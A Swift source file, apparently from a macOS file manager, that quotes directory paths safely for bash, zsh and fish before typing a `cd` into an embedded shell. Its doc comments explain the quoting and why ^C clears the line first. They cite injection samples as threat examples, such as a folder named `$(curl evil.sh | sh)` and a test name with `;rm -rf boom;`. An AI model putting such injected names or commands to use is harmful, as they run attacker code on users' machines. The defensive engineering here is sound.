import Foundation

/// Building the text Dirnex types into a drawer's shell on the user's behalf — today, the `cd` that
/// makes the drawer follow the active panel (PLAN.md §M6 "bottom pane following active panel's
/// cwd").
///
/// This is the security-critical half of the drawer, and the reason it is pure and tested: a
/// directory name is **attacker-controlled data** — unzip an archive from the internet and you can
/// be browsing a folder called ``$(curl evil.sh | sh)`` — and everything here ends up on the command
/// line of an interactive shell that will execute it. Every byte we write is quoted by
/// `ShellQuoting`; nothing is interpolated raw.
public enum ShellQuoting {
    /// `path` as a single shell word, safe to place in a command line for `kind`.
    ///
    /// POSIX shells (and everything in `.other`) get single quotes, inside which **no** escape
    /// exists — `$`, backticks, `;`, `&`, `|`, spaces and newlines are all literal. That leaves one
    /// character to handle, the single quote itself, which ends the quoting; the classic
    /// `'` → `'\''` closes the string, escapes a literal quote, and reopens it.
    ///
    /// `fish` is the exception, and the reason `ShellKind` distinguishes it at all: its single
    /// quotes *do* honour backslash escapes, so a POSIX `'\''` would leave a stray backslash in the
    /// path. It needs `\` and `'` backslash-escaped instead.
    ///
    /// Verified against real shells: a directory named
    /// ``it's a "test" $(touch …) `touch …` ;rm -rf boom; & |x`` is entered correctly by both
    /// `zsh` and `bash`, with neither substitution firing.
    public static func quoted(_ path: String, for kind: ShellKind) -> String {
        switch kind {
        case .fish:
            let escaped = path
                .replacingOccurrences(of: "\\", with: "\\\\")
                .replacingOccurrences(of: "'", with: "\\'")
            return "'\(escaped)'"
        case .zsh, .bash, .other:
            return "'" + path.replacingOccurrences(of: "'", with: "'\\''") + "'"
        }
    }
}

/// The keystrokes that move a drawer's shell to a directory.
public enum ShellCommandLine {
    /// What to write into the shell's pseudo-terminal to put it in `directoryPath`.
    ///
    /// Three deliberate pieces sit in front of the command:
    ///
    /// - **`^C` clears whatever is already typed, and is a safety measure, not tidiness.** The line
    ///   editor may hold a half-typed command; appending `cd …` to it and pressing Return would
    ///   execute *their* words plus ours. Someone who had typed `rm -rf /` and thought better of it
    ///   would watch us run `rm -rf / cd -- '/x'`.
    /// - **`^C` is the only thing that can clear it, because it is not a keystroke.** Every
    ///   line-editor key we might use is a bet on the user's keymap, and the bet loses: `^K`, `^A`
    ///   and `^E` are all `self-insert` in *both* `bash`'s `vi-insert` and `zsh`'s `viins` (dumped
    ///   from the real shells), so they type themselves into the line rather than editing it — a
    ///   `^K` left `bash` reporting `$'\v': command not found` and the `cd` never landed. `^U` is
    ///   no better: `bash` binds it to `unix-line-discard`, but `zsh`'s `viins` binds it to
    ///   `vi-kill-line`, which kills back only to *wherever insert mode was entered* — so a user
    ///   who typed a command, pressed `ESC` and then `A` to append has an insert point at the end
    ///   of their line, `^U` kills nothing, and their abandoned words **execute** with our `cd`
    ///   glued on. There is no forward-kill bound in either shell's vi keymap to fall back to.
    ///   `^C` sidesteps the whole question: it is `VINTR`, handled by the *terminal line
    ///   discipline* below the editor, so the keymap is irrelevant — and every shell answers
    ///   `SIGINT` at a prompt by abandoning the line and starting a fresh one **in insert mode**,
    ///   which is exactly the state a plain-text `cd` needs. Nothing else covers a user idling in
    ///   vi *command* mode, where `cd -- '/x'` is read as editor commands, not text. Verified in a
    ///   pty across `bash`/`zsh` × emacs/vi × five prompt states: `^C` is the only sequence clean
    ///   in all of them, and it never dings (so no space is needed to stop `bash`'s `^U` ringing
    ///   the bell at column zero — there is no `^U` left to ring it).
    /// - **It costs one prompt line per move, and that is the deliberate trade.** `SIGINT` makes
    ///   the shell redraw its prompt, so a followed `cd` leaves the abandoned prompt above it
    ///   rather than typing on it. Correctness for vi users — whose drawer otherwise never follows
    ///   at all — is worth more than a tidy scrollback, and the cost only lands on *real* moves:
    ///   `ShellWorkingDirectory.command(toFollow:)` emits nothing when the shell is already there.
    /// - **The `SIGINT` can only ever reach the shell**, never a running command, because
    ///   `TerminalDrawerViewController` writes only when `ShellWorkingDirectory.isAtPrompt` says
    ///   the shell *is* the terminal's foreground process group. That gate already existed to keep
    ///   us from typing into somebody's `vim`; it is what makes sending a signal safe.
    /// - **The leading space** asks the shell to keep our synthetic command out of the user's
    ///   history (`HIST_IGNORE_SPACE` in zsh, `HISTCONTROL=ignorespace` in bash). Neither is on by
    ///   default, so this is a courtesy that lands for the people who opted in, not a guarantee.
    ///   What keeps history genuinely clean is the caller: `ShellWorkingDirectory.command(toFollow:)`
    ///   emits nothing at all when the shell is already in the right place, which is the common case.
    /// - **`cd --`** ends option parsing, so a directory named `-p` is a path rather than a flag.
    ///   Panels only ever navigate to absolute paths, so this is belt-and-braces; `fish` is left
    ///   with a plain `cd` because its `cd` is a function whose `--` handling is not the shell's to
    ///   promise. (Plain `cd` also means a user's own `cd` — `zoxide`, an auto-`ls` wrapper — still
    ///   runs, which is their setup working as they configured it. `builtin cd` would be more
    ///   predictable for us and ruder to them.)
    public static func changeDirectory(to directoryPath: String, kind: ShellKind) -> String {
        let quoted = ShellQuoting.quoted(directoryPath, for: kind)
        let command = kind == .fish ? "cd \(quoted)" : "cd -- \(quoted)"
        return "\(clearLine) \(command)\n"
    }

    /// `^C` — `VINTR`, which the terminal's line discipline turns into `SIGINT` before the shell's
    /// line editor ever sees a byte, so it abandons the line whatever keymap the user is in.
    private static let clearLine = "\u{03}"
}
